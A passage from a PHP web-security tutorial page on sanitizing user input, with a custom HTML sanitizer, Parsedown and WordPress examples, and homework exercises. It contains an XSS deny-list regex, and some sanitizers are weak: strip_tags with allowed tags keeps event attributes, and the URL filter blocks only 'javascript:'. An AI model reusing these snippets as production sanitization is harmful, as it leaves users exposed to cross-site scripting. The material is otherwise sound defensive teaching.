        'img' => ['src', 'alt', 'title', 'width', 'height', 'class', 'id']
    ];
    
    // Remove all HTML tags not in our allowed list
    $content = strip_tags($content, '<' . implode('><', array_keys($allowed_tags)) . '>');
    
    // Load content into DOMDocument for processing
    $dom = new DOMDocument();
    
    // Suppress errors for malformed HTML
    libxml_use_internal_errors(true);
    $dom->loadHTML('<div>' . $content . '</div>', LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
    libxml_clear_errors();
    
    // Process all elements
    $elements = $dom->getElementsByTagName('*');
    for ($i = $elements->length - 1; $i >= 0; $i--) {
        $element = $elements->item($i);
        $tag_name = strtolower($element->tagName);
        
        // Remove disallowed tags
        if (!isset($allowed_tags[$tag_name])) {
            $element->parentNode->removeChild($element);
            continue;
        }
        
        // Process attributes
        $allowed_attributes = $allowed_tags[$tag_name];
        $attributes = $element->attributes;
        
        for ($j = $attributes->length - 1; $j >= 0; $j--) {
            $attribute = $attributes->item($j);
            $attribute_name = strtolower($attribute->name);
            
            // Remove disallowed attributes
            if (!in_array($attribute_name, $allowed_attributes)) {
                $element->removeAttribute($attribute_name);
                continue;
            }
            
            // Sanitize URLs in href and src attributes
            if ($attribute_name === 'href' || $attribute_name === 'src') {
                $url = $attribute->value;
                $sanitized_url = filter_var($url, FILTER_SANITIZE_URL);
                
                // Additional checks for JavaScript URLs
                if (preg_match('/^javascript:/i', $sanitized_url)) {
                    $element->removeAttribute($attribute_name);
                } else {
                    $element->setAttribute($attribute_name, $sanitized_url);
                }
            }
            
            // Sanitize style attributes (simplified example)
            if ($attribute_name === 'style') {
                $style = $attribute->value;
                // Remove potentially harmful CSS
                $sanitized_style = preg_replace('/expression\s*\(|javascript:|behavior:|position\s*:\s*fixed/i', '', $style);
                $element->setAttribute($attribute_name, $sanitized_style);
            }
        }
    }
    
    // Get the body content only
    $body = $dom->getElementsByTagName('div')->item(0);
    $clean_html = '';
    
    if ($body) {
        foreach ($body->childNodes as $child) {
            $clean_html .= $dom->saveHTML($child);
        }
    }
    
    return $clean_html;
}

// Usage
$sanitized_content = sanitize_rich_content($_POST['editor_content']);
?&gt;</code></pre>
                
                <p><strong>Note:</strong> The above function is a simplified example. For production use, consider using established libraries like HTML Purifier instead of creating your own sanitization functions.</p>
            </div>
            
            <div class="markdown-approach">
                <h3>Using Markdown Instead of HTML</h3>
                <p>For many applications, allowing Markdown instead of HTML is a safer approach while still providing rich content capabilities.</p>
                
                <h4>Example of Markdown Approach:</h4>
                <pre><code>&lt;?php
// First, install Parsedown via Composer:
// composer require erusev/parsedown

// Basic Parsedown usage
require_once 'vendor/autoload.php';

// Sanitize the markdown input (still important!)
$markdown = htmlspecialchars($_POST['content']);

// Convert to HTML
$parsedown = new Parsedown();
$parsedown->setSafeMode(true); // Important for security!
$html = $parsedown->text($markdown);

// Output is now safe to display
echo $html;

// If you need to allow certain HTML within Markdown
$parsedown = new Parsedown();
$parsedown->setSafeMode(true);
$parsedown->setMarkupEscaped(false); // Be careful with this option!
$html = $parsedown->text($markdown);
?&gt;</code></pre>
                
                <h4>Advantages of Using Markdown:</h4>
                <ul>
                    <li>Simpler syntax for users to learn compared to HTML</li>
                    <li>Reduced attack surface for XSS</li>
                    <li>Easier to sanitize and control</li>
                    <li>Libraries like Parsedown handle the HTML generation safely</li>
                    <li>Works well for comments, forum posts, and other user-generated content</li>
                </ul>
            </div>
        </section>

        <section class="sanitization-best_practices">
            <h2>Sanitization Best Practices</h2>
            <p>Follow these best practices to ensure your application's security through proper sanitization.</p>
            
            <div class="best-practices_list">
                <h3>General Sanitization Principles</h3>
                <ol>
                    <li><strong>Validate input, sanitize output</strong>: Validate that input meets your requirements, then sanitize it before using it in a specific context.</li>
                    <li><strong>Context matters</strong>: Use the appropriate sanitization method for each context (HTML, SQL, URLs, etc.).</li>
                    <li><strong>Defense in depth</strong>: Apply multiple layers of security rather than relying on a single sanitization method.</li>
                    <li><strong>Whitelist, don't blacklist</strong>: Allow only known-good input rather than trying to block known-bad input.</li>
                    <li><strong>Never trust user input</strong>: Even if you've validated it on the client side.</li>
                    <li><strong>Store data in its rawest form</strong>: Sanitize when outputting, not necessarily when storing.</li>
                    <li><strong>Use prepared statements for SQL</strong>: They're the most reliable way to prevent SQL injection.</li>
                    <li><strong>Encode special characters</strong>: Use context-appropriate encoding functions like htmlspecialchars() for HTML.</li>
                    <li><strong>Use established libraries</strong>: Don't reinvent the wheel for complex sanitization needs.</li>
                    <li><strong>Keep dependencies updated</strong>: Security vulnerabilities are frequently discovered and patched in libraries.</li>
                </ol>
            </div>
            
            <div class="practical-example">
                <h3>Complete Sanitization Example</h3>
                <pre><code>&lt;?php
/**
 * Example User Profile Update Form Processing
 * Demonstrating proper sanitization in different contexts
 */

// Start session
session_start();

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Initialize arrays for data and errors
    $data = [];
    $errors = [];
    
    // Validate and sanitize username
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    if (empty($username)) {
        $errors['username'] = 'Username is required';
    } elseif (strlen($username) < 3 || strlen($username) > 20) {
        $errors['username'] = 'Username must be between 3 and 20 characters';
    } elseif (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
        $errors['username'] = 'Username can only contain letters, numbers, and underscores';
    } else {
        $data['username'] = $username;
    }
    
    // Validate and sanitize email
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    } else {
        $data['email'] = $email;
    }
    
    // Validate and sanitize website URL (optional field)
    $website = filter_input(INPUT_POST, 'website', FILTER_SANITIZE_URL);
    if (!empty($website)) {
        if (!filter_var($website, FILTER_VALIDATE_URL)) {
            $errors['website'] = 'Invalid website URL';
        } else {
            $data['website'] = $website;
        }
    } else {
        $data['website'] = null; // Set to null if empty
    }
    
    // Validate and sanitize bio (allow some HTML tags)
    $bio = $_POST['bio'] ?? '';
    if (!empty($bio)) {
        // Option 1: Strip all HTML tags
        //$data['bio'] = strip_tags($bio);
        
        // Option 2: Allow limited HTML tags
        $allowed_tags = '<p><a><strong><em><ul><ol><li><br>';
        $data['bio'] = strip_tags($bio, $allowed_tags);
        
        // Option 3: Use HTML Purifier (preferred for rich content)
        // require_once 'vendor/autoload.php';
        // $config = HTMLPurifier_Config::createDefault();
        // $config->set('HTML.Allowed', 'p,a[href|title],strong,em,ul,ol,li,br');
        // $purifier = new HTMLPurifier($config);
        // $data['bio'] = $purifier->purify($bio);
    } else {
        $data['bio'] = '';
    }
    
    // Validate age as integer
    $age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT, [
        'options' => [
            'default' => 0,
            'min_range' => 13,
            'max_range' => 120
        ]
    ]);
    
    if ($age === 0) {
        $errors['age'] = 'Please enter a valid age between 13 and 120';
    } else {
        $data['age'] = $age;
    }
    
    // Process the data if no errors
    if (empty($errors)) {
        try {
            // Database connection
            $pdo = new PDO('mysql:host=localhost;dbname=myapp', 'username', 'password');
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            // Prepare statement for updating user profile
            $stmt = $pdo->prepare("
                UPDATE users 
                SET username = :username, 
                    email = :email, 
                    website = :website, 
                    bio = :bio, 
                    age = :age 
                WHERE id = :user_id
            ");
            
            // Execute statement with sanitized data
            $stmt->execute([
                ':username' => $data['username'],
                ':email' => $data['email'],
                ':website' => $data['website'],
                ':bio' => $data['bio'],
                ':age' => $data['age'],
                ':user_id' => $_SESSION['user_id'] // Assuming user ID is stored in session
            ]);
            
            // Set success message
            $_SESSION['success_message'] = 'Profile updated successfully!';
            
            // Redirect to prevent resubmission
            header('Location: profile.php');
            exit;
            
        } catch (PDOException $e) {
            // Log the error (don't show database errors to users)
            error_log('Database error: ' . $e->getMessage());
            $_SESSION['error_message'] = 'An error occurred. Please try again later.';
            
            // Preserve form data in session
            $_SESSION['form_data'] = $data;
            
            // Redirect to prevent resubmission
            header('Location: edit_profile.php');
            exit;
        }
    } else {
        // Store errors and form data in session
        $_SESSION['errors'] = $errors;
        $_SESSION['form_data'] = $data;
        
        // Redirect to prevent resubmission
        header('Location: edit_profile.php');
        exit;
    }
}

// Display form with errors and preserved data
$errors = $_SESSION['errors'] ?? [];
$form_data = $_SESSION['form_data'] ?? [];
$success_message = $_SESSION['success_message'] ?? '';

// Clear session variables
unset($_SESSION['errors']);
unset($_SESSION['form_data']);
unset($_SESSION['success_message']);
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Edit Profile&lt;/title&gt;
    &lt;style&gt;
        .error { color: red; font-size: 0.9em; }
        .success { color: green; font-weight: bold; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Edit Profile&lt;/h1&gt;
    
    &lt;?php if (!empty($success_message)): ?&gt;
        &lt;div class="success"&gt;&lt;?php echo htmlspecialchars($success_message); ?&gt;&lt;/div&gt;
    &lt;?php endif; ?&gt;
    
    &lt;form method="post" action=""&gt;
        &lt;div&gt;
            &lt;label for="username"&gt;Username:&lt;/label&gt;
            &lt;input type="text" id="username" name="username" value="&lt;?php echo htmlspecialchars($form_data['username'] ?? ''); ?&gt;"&gt;
            &lt;?php if (isset($errors['username'])): ?&gt;
                &lt;div class="error"&gt;&lt;?php echo htmlspecialchars($errors['username']); ?&gt;&lt;/div&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="email"&gt;Email:&lt;/label&gt;
            &lt;input type="email" id="email" name="email" value="&lt;?php echo htmlspecialchars($form_data['email'] ?? ''); ?&gt;"&gt;
            &lt;?php if (isset($errors['email'])): ?&gt;
                &lt;div class="error"&gt;&lt;?php echo htmlspecialchars($errors['email']); ?&gt;&lt;/div&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="website"&gt;Website (optional):&lt;/label&gt;
            &lt;input type="url" id="website" name="website" value="&lt;?php echo htmlspecialchars($form_data['website'] ?? ''); ?&gt;"&gt;
            &lt;?php if (isset($errors['website'])): ?&gt;
                &lt;div class="error"&gt;&lt;?php echo htmlspecialchars($errors['website']); ?&gt;&lt;/div&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="age"&gt;Age:&lt;/label&gt;
            &lt;input type="number" id="age" name="age" min="13" max="120" value="&lt;?php echo htmlspecialchars($form_data['age'] ?? ''); ?&gt;"&gt;
            &lt;?php if (isset($errors['age'])): ?&gt;
                &lt;div class="error"&gt;&lt;?php echo htmlspecialchars($errors['age']); ?&gt;&lt;/div&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;label for="bio"&gt;Bio:&lt;/label&gt;
            &lt;textarea id="bio" name="bio" rows="5" cols="50"&gt;&lt;?php echo htmlspecialchars($form_data['bio'] ?? ''); ?&gt;&lt;/textarea&gt;
            &lt;?php if (isset($errors['bio'])): ?&gt;
                &lt;div class="error"&gt;&lt;?php echo htmlspecialchars($errors['bio']); ?&gt;&lt;/div&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div&gt;
            &lt;button type="submit"&gt;Update Profile&lt;/button&gt;
        &lt;/div&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            </div>
        </section>

        <section class="wordpress-sanitization">
            <h2>Sanitization in WordPress</h2>
            <p>WordPress provides several built-in functions for sanitizing different types of data in various contexts.</p>
            
            <div class="wp-sanitization_functions">
                <h3>WordPress Sanitization Functions</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Function</th>
                            <th>Purpose</th>
                            <th>Example</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>sanitize_text_field()</code></td>
                            <td>Sanitizes a string by removing HTML tags and normalizing whitespace</td>
                            <td><code>$name = sanitize_text_field($_POST['name']);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_textarea_field()</code></td>
                            <td>Similar to sanitize_text_field() but preserves newlines</td>
                            <td><code>$message = sanitize_textarea_field($_POST['message']);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_email()</code></td>
                            <td>Strips invalid characters from email addresses</td>
                            <td><code>$email = sanitize_email($_POST['email']);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_title()</code></td>
                            <td>Converts title to safe slug format</td>
                            <td><code>$slug = sanitize_title($title);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_file_name()</code></td>
                            <td>Sanitizes a filename</td>
                            <td><code>$filename = sanitize_file_name($_FILES['file']['name']);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_key()</code></td>
                            <td>Sanitizes a key/slug (lowercase alphanumeric, dashes, and underscores)</td>
                            <td><code>$key = sanitize_key($_GET['key']);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_meta()</code></td>
                            <td>Sanitizes metadata based on context</td>
                            <td><code>$meta_value = sanitize_meta($key, $value, $object_type);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_html_class()</code></td>
                            <td>Sanitizes an HTML classname</td>
                            <td><code>$class = sanitize_html_class($_GET['class']);</code></td>
                        </tr>
                        <tr>
                            <td><code>sanitize_user()</code></td>
                            <td>Sanitizes a username</td>
                            <td><code>$user = sanitize_user($_POST['username']);</code></td>
                        </tr>
                        <tr>
                            <td><code>wp_kses()</code></td>
                            <td>Filters content with allowed HTML tags/attributes</td>
                            <td><code>$content = wp_kses($content, $allowed_html);</code></td>
                        </tr>
                        <tr>
                            <td><code>wp_kses_post()</code></td>
                            <td>Filters content with allowed post HTML</td>
                            <td><code>$post_content = wp_kses_post($_POST['content']);</code></td>
                        </tr>
                    </tbody>
                </table>
            </div>
            
            <div class="wp-examples">
                <h3>WordPress Sanitization Examples</h3>
                <pre><code>&lt;?php
/**
 * Example plugin form handling with WordPress sanitization functions
 */
function my_plugin_process_form() {
    // Check if form was submitted
    if (isset($_POST['my_plugin_form_submit']) && check_admin_referer('my_plugin_form_action', 'my_plugin_nonce')) {
        // Sanitize form fields
        $title = sanitize_text_field($_POST['title'] ?? '');
        $slug = sanitize_title($_POST['title'] ?? '');
        $email = sanitize_email($_POST['email'] ?? '');
        $website = esc_url_raw($_POST['website'] ?? '');
        $description = sanitize_textarea_field($_POST['description'] ?? '');
        
        // Allow only certain HTML tags in content
        $allowed_html = [
            'a' => [
                'href' => [],
                'title' => [],
                'target' => []
            ],
            'p' => [],
            'strong' => [],
            'em' => [],
            'ul' => [],
            'ol' => [],
            'li' => []
        ];
        
        $content = wp_kses($_POST['content'] ?? '', $allowed_html);
        
        // For post content (with WordPress allowed HTML)
        $post_content = wp_kses_post($_POST['post_content'] ?? '');
        
        // Save options to database
        update_option('my_plugin_title', $title);
        update_option('my_plugin_email', $email);
        update_option('my_plugin_website', $website);
        update_option('my_plugin_description', $description);
        update_option('my_plugin_content', $content);
        update_option('my_plugin_post_content', $post_content);
        
        // Set success message
        add_settings_error(
            'my_plugin_messages',
            'my_plugin_success',
            'Settings saved successfully.',
            'updated'
        );
    }
}
add_action('admin_init', 'my_plugin_process_form');

/**
 * Display the plugin settings form
 */
function my_plugin_settings_page() {
    // Get saved options
    $title = get_option('my_plugin_title', '');
    $email = get_option('my_plugin_email', '');
    $website = get_option('my_plugin_website', '');
    $description = get_option('my_plugin_description', '');
    $content = get_option('my_plugin_content', '');
    $post_content = get_option('my_plugin_post_content', '');
    
    // Display settings errors
    settings_errors('my_plugin_messages');
    ?&gt;
    
    &lt;div class="wrap"&gt;
        &lt;h1&gt;&lt;?php echo esc_html(get_admin_page_title()); ?&gt;&lt;/h1&gt;
        
        &lt;form method="post" action=""&gt;
            &lt;?php wp_nonce_field('my_plugin_form_action', 'my_plugin_nonce'); ?&gt;
            
            &lt;table class="form-table"&gt;
                &lt;tr&gt;
                    &lt;th scope="row"&gt;&lt;label for="title"&gt;Title&lt;/label&gt;&lt;/th&gt;
                    &lt;td&gt;
                        &lt;input type="text" id="title" name="title" value="&lt;?php echo esc_attr($title); ?&gt;" class="regular-text"&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                
                &lt;tr&gt;
                    &lt;th scope="row"&gt;&lt;label for="email"&gt;Email&lt;/label&gt;&lt;/th&gt;
                    &lt;td&gt;
                        &lt;input type="email" id="email" name="email" value="&lt;?php echo esc_attr($email); ?&gt;" class="regular-text"&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                
                &lt;tr&gt;
                    &lt;th scope="row"&gt;&lt;label for="website"&gt;Website&lt;/label&gt;&lt;/th&gt;
                    &lt;td&gt;
                        &lt;input type="url" id="website" name="website" value="&lt;?php echo esc_url($website); ?&gt;" class="regular-text"&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                
                &lt;tr&gt;
                    &lt;th scope="row"&gt;&lt;label for="description"&gt;Description&lt;/label&gt;&lt;/th&gt;
                    &lt;td&gt;
                        &lt;textarea id="description" name="description" rows="5" class="large-text"&gt;&lt;?php echo esc_textarea($description); ?&gt;&lt;/textarea&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                
                &lt;tr&gt;
                    &lt;th scope="row"&gt;&lt;label for="content"&gt;Limited HTML Content&lt;/label&gt;&lt;/th&gt;
                    &lt;td&gt;
                        &lt;textarea id="content" name="content" rows="5" class="large-text"&gt;&lt;?php echo esc_textarea($content); ?&gt;&lt;/textarea&gt;
                        &lt;p class="description"&gt;Allowed HTML: a (href, title, target), p, strong, em, ul, ol, li&lt;/p&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
                
                &lt;tr&gt;
                    &lt;th scope="row"&gt;&lt;label for="post_content"&gt;Post Content&lt;/label&gt;&lt;/th&gt;
                    &lt;td&gt;
                        &lt;?php wp_editor($post_content, 'post_content', ['textarea_rows' => 10]); ?&gt;
                        &lt;p class="description"&gt;Standard WordPress content editor with allowed HTML.&lt;/p&gt;
                    &lt;/td&gt;
                &lt;/tr&gt;
            &lt;/table&gt;
            
            &lt;p class="submit"&gt;
                &lt;input type="submit" name="my_plugin_form_submit" class="button button-primary" value="Save Settings"&gt;
            &lt;/p&gt;
        &lt;/form&gt;
    &lt;/div&gt;
    &lt;?php
}

/**
 * Secure Ajax handler for WordPress
 */
function my_plugin_ajax_handler() {
    // Check for nonce security
    check_ajax_referer('my_plugin_ajax_nonce', 'security');
    
    // Sanitize input data
    $action = sanitize_key($_POST['custom_action'] ?? '');
    $item_id = absint($_POST['item_id'] ?? 0);
    
    // Perform different actions based on requested action
    switch ($action) {
        case 'delete_item':
            // Check user permissions
            if (!current_user_can('delete_posts')) {
                wp_send_json_error('Permission denied');
            }
            
            // Process the delete action
            $result = wp_delete_post($item_id, true);
            
            if ($result) {
                wp_send_json_success('Item deleted successfully');
            } else {
                wp_send_json_error('Error deleting item');
            }
            break;
            
        case 'update_status':
            // Sanitize status
            $status = sanitize_key($_POST['status'] ?? '');
            
            // Validate status
            $allowed_statuses = ['draft', 'pending', 'publish'];
            if (!in_array($status, $allowed_statuses)) {
                wp_send_json_error('Invalid status');
            }
            
            // Update post status
            $result = wp_update_post([
                'ID' => $item_id,
                'post_status' => $status
            ]);
            
            if ($result) {
                wp_send_json_success('Status updated successfully');
            } else {
                wp_send_json_error('Error updating status');
            }
            break;
            
        default:
            wp_send_json_error('Invalid action');
            break;
    }
    
    // Always die in functions handling Ajax
    wp_die();
}
add_action('wp_ajax_my_plugin_action', 'my_plugin_ajax_handler');
?&gt;</code></pre>
                
                <h3>WordPress Front-End Form Sanitization</h3>
                <pre><code>&lt;?php
/**
 * Process a front-end form in WordPress
 */
function process_contact_form() {
    // Check if form was submitted
    if (isset($_POST['contact_submit'])) {
        // Verify nonce
        if (!isset($_POST['contact_nonce']) || !wp_verify_nonce($_POST['contact_nonce'], 'contact_form_nonce')) {
            wp_die('Security check failed');
        }
        
        // Initialize errors array
        $errors = [];
        
        // Sanitize and validate name
        $name = sanitize_text_field($_POST['name'] ?? '');
        if (empty($name)) {
            $errors['name'] = 'Please enter your name';
        }
        
        // Sanitize and validate email
        $email = sanitize_email($_POST['email'] ?? '');
        if (empty($email) || !is_email($email)) {
            $errors['email'] = 'Please enter a valid email address';
        }
        
        // Sanitize and validate subject
        $subject = sanitize_text_field($_POST['subject'] ?? '');
        if (empty($subject)) {
            $errors['subject'] = 'Please enter a subject';
        }
        
        // Sanitize and validate message
        $message = sanitize_textarea_field($_POST['message'] ?? '');
        if (empty($message)) {
            $errors['message'] = 'Please enter your message';
        }
        
        // If no errors, process the form
        if (empty($errors)) {
            // Format email content
            $email_content = "Name: $name
";
            $email_content .= "Email: $email

";
            $email_content .= "Message:
$message";
            
            // Email headers
            $headers = ['Content-Type: text/plain; charset=UTF-8'];
            $headers[] = 'From: ' . get_bloginfo('name') . ' <' . get_option('admin_email') . '>';
            $headers[] = 'Reply-To: ' . $name . ' <' . $email . '>';
            
            // Send email
            $mail_sent = wp_mail(get_option('admin_email'), $subject, $email_content, $headers);
            
            if ($mail_sent) {
                // Redirect to thank you page
                wp_redirect(home_url('/thank-you/'));
                exit;
            } else {
                // Set error message in session
                $_SESSION['contact_error'] = 'There was a problem sending your message. Please try again.';
                
                // Save form data in session
                $_SESSION['contact_form'] = [
                    'name' => $name,
                    'email' => $email,
                    'subject' => $subject,
                    'message' => $message
                ];
                
                // Redirect back to form
                wp_redirect(wp_get_referer());
                exit;
            }
        } else {
            // Save errors and form data in session
            $_SESSION['contact_errors'] = $errors;
            $_SESSION['contact_form'] = [
                'name' => $name,
                'email' => $email,
                'subject' => $subject,
                'message' => $message
            ];
            
            // Redirect back to form
            wp_redirect(wp_get_referer());
            exit;
        }
    }
}
add_action('template_redirect', 'process_contact_form');

/**
 * Shortcode to display contact form
 */
function contact_form_shortcode() {
    // Start output buffering
    ob_start();
    
    // Get saved errors and form data
    $errors = $_SESSION['contact_errors'] ?? [];
    $form_data = $_SESSION['contact_form'] ?? [];
    $error_message = $_SESSION['contact_error'] ?? '';
    
    // Clear session variables
    unset($_SESSION['contact_errors']);
    unset($_SESSION['contact_form']);
    unset($_SESSION['contact_error']);
    
    // Display error message if any
    if (!empty($error_message)) {
        echo '&lt;div class="error-message"&gt;' . esc_html($error_message) . '&lt;/div&gt;';
    }
    
    // Display the form
    ?&gt;
    &lt;form method="post" class="contact-form"&gt;
        &lt;?php wp_nonce_field('contact_form_nonce', 'contact_nonce'); ?&gt;
        
        &lt;div class="form-group"&gt;
            &lt;label for="name"&gt;Name *&lt;/label&gt;
            &lt;input type="text" id="name" name="name" value="&lt;?php echo esc_attr($form_data['name'] ?? ''); ?&gt;" required&gt;
            &lt;?php if (isset($errors['name'])): ?&gt;
                &lt;span class="error"&gt;&lt;?php echo esc_html($errors['name']); ?&gt;&lt;/span&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div class="form-group"&gt;
            &lt;label for="email"&gt;Email *&lt;/label&gt;
            &lt;input type="email" id="email" name="email" value="&lt;?php echo esc_attr($form_data['email'] ?? ''); ?&gt;" required&gt;
            &lt;?php if (isset($errors['email'])): ?&gt;
                &lt;span class="error"&gt;&lt;?php echo esc_html($errors['email']); ?&gt;&lt;/span&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div class="form-group"&gt;
            &lt;label for="subject"&gt;Subject *&lt;/label&gt;
            &lt;input type="text" id="subject" name="subject" value="&lt;?php echo esc_attr($form_data['subject'] ?? ''); ?&gt;" required&gt;
            &lt;?php if (isset($errors['subject'])): ?&gt;
                &lt;span class="error"&gt;&lt;?php echo esc_html($errors['subject']); ?&gt;&lt;/span&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div class="form-group"&gt;
            &lt;label for="message"&gt;Message *&lt;/label&gt;
            &lt;textarea id="message" name="message" rows="5" required&gt;&lt;?php echo esc_textarea($form_data['message'] ?? ''); ?&gt;&lt;/textarea&gt;
            &lt;?php if (isset($errors['message'])): ?&gt;
                &lt;span class="error"&gt;&lt;?php echo esc_html($errors['message']); ?&gt;&lt;/span&gt;
            &lt;?php endif; ?&gt;
        &lt;/div&gt;
        
        &lt;div class="form-group"&gt;
            &lt;input type="submit" name="contact_submit" value="Send Message" class="submit-button"&gt;
        &lt;/div&gt;
    &lt;/form&gt;
    &lt;?php
    
    // Return the buffered content
    return ob_get_clean();
}
add_shortcode('contact_form', 'contact_form_shortcode');
?&gt;</code></pre>
            </div>
            
            <div class="wp-security_functions">
                <h3>WordPress Security Functions</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Function</th>
                            <th>Purpose</th>
                            <th>Example</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>wp_nonce_field()</code></td>
                            <td>Creates a nonce field for a form</td>
                            <td><code>wp_nonce_field('action_name', 'field_name');</code></td>
                        </tr>
                        <tr>
                            <td><code>wp_verify_nonce()</code></td>
                            <td>Verifies a nonce</td>
                            <td><code>wp_verify_nonce($_POST['nonce'], 'action_name');</code></td>
                        </tr>
                        <tr>
                            <td><code>check_admin_referer()</code></td>
                            <td>Verifies a nonce for admin pages</td>
                            <td><code>check_admin_referer('action_name', 'nonce_name');</code></td>
                        </tr>
                        <tr>
                            <td><code>check_ajax_referer()</code></td>
                            <td>Verifies a nonce for Ajax requests</td>
                            <td><code>check_ajax_referer('ajax_nonce', 'security');</code></td>
                        </tr>
                        <tr>
                            <td><code>wp_create_nonce()</code></td>
                            <td>Creates a nonce</td>
                            <td><code>$nonce = wp_create_nonce('action_name');</code></td>
                        </tr>
                        <tr>
                            <td><code>current_user_can()</code></td>
                            <td>Checks user capabilities</td>
                            <td><code>if (current_user_can('edit_posts')) { ... }</code></td>
                        </tr>
                        <tr>
                            <td><code>esc_url()</code></td>
                            <td>Escapes a URL for safe output</td>
                            <td><code>echo esc_url($url);</code></td>
                        </tr>
                        <tr>
                            <td><code>esc_url_raw()</code></td>
                            <td>Escapes a URL for database storage</td>
                            <td><code>$safe_url = esc_url_raw($_POST['url']);</code></td>
                        </tr>
                        <tr>
                            <td><code>esc_attr()</code></td>
                            <td>Escapes for HTML attributes</td>
                            <td><code>echo 'value="' . esc_attr($value) . '"';</code></td>
                        </tr>
                        <tr>
                            <td><code>esc_html()</code></td>
                            <td>Escapes for HTML output</td>
                            <td><code>echo esc_html($text);</code></td>
                        </tr>
                        <tr>
                            <td><code>esc_js()</code></td>
                            <td>Escapes for use in JavaScript</td>
                            <td><code>echo 'var data = "' . esc_js($data) . '"';</code></td>
                        </tr>
                        <tr>
                            <td><code>esc_textarea()</code></td>
                            <td>Escapes for use in a textarea</td>
                            <td><code>echo esc_textarea($content);</code></td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </section>

        <section class="homework">
            <h2>Homework: Sanitization Practice</h2>
            <p>Complete the following exercises to practice sanitizing user input in various contexts.</p>
            
            <div class="homework-tasks">
                <h3>Task 1: Basic Sanitization</h3>
                <p>Create a simple contact form with the following fields:</p>
                <ul>
                    <li>Name</li>
                    <li>Email</li>
                    <li>Phone</li>
                    <li>Message</li>
                </ul>
                <p>Implement the following:</p>
                <ol>
                    <li>Server-side validation for all fields</li>
                    <li>Appropriate sanitization for each field type</li>
                    <li>Display sanitized data in a confirmation message</li>
                    <li>Store sanitized data in a file or database</li>
                    <li>Include comments explaining your sanitization choices</li>
                </ol>
                
                <h3>Task 2: Context-Specific Sanitization</h3>
                <p>Create a PHP script that:</p>
                <ol>
                    <li>Takes user input and outputs it in different contexts (HTML, SQL, JavaScript, URL)</li>
                    <li>Demonstrates appropriate sanitization for each context</li>
                    <li>Shows what would happen without proper sanitization (with commented-out examples)</li>
                    <li>Creates a table comparing the input and output for each context</li>
                </ol>
                
                <h3>Task 3: WordPress Sanitization</h3>
                <p>Create a simple WordPress plugin that:</p>
                <ol>
                    <li>Adds a settings page with various input types (text, textarea, email, URL, etc.)</li>
                    <li>Properly sanitizes all input using WordPress functions</li>
                    <li>Includes security features like nonces and capability checks</li>
                    <li>Stores sanitized data in the WordPress options table</li>
                    <li>Displays sanitized data safely on the front-end</li>
                </ol>
                
                <h3>Bonus Challenge: Rich Text Editor</h3>
                <p>Create a system for allowing users to input rich text content (with some HTML allowed) while maintaining security:</p>
                <ol>
                    <li>Implement a rich text editor (can use a JavaScript library like TinyMCE)</li>
                    <li>Define a whitelist of allowed HTML tags and attributes</li>
                    <li>Create a custom sanitization function that allows the whitelisted HTML but removes everything else</li>
                    <li>Handle special cases like URLs in href attributes</li>
                    <li>Display the sanitized rich content safely</li>
                </ol>
            </div>
        </section>

        <section class="additional-resources">
            <h2>Additional Resources</h2>
            
            <div class="resources-list">
                <h3>PHP Security Documentation</h3>
                <ul>
                    <li><a href="https://www.php.net/manual/en/book.filter.php" target="_blank">PHP Filter Functions</a></li>
                    <li><a href="https://www.php.net/manual/en/security.database.sql-injection.php" target="_blank">PHP SQL Injection Prevention</a></li>
                    <li><a href="https://www.php.net/manual/en/function.htmlspecialchars.php" target="_blank">htmlspecialchars() Function</a></li>
                </ul>
                
                <h3>WordPress Documentation</h3>
                <ul>
                    <li><a href="https://developer.wordpress.org/themes/theme-security/data-sanitization-escaping/" target="_blank">WordPress Data Sanitization</a></li>
                    <li><a href="https://developer.wordpress.org/plugins/security/" target="_blank">WordPress Plugin Security</a></li>
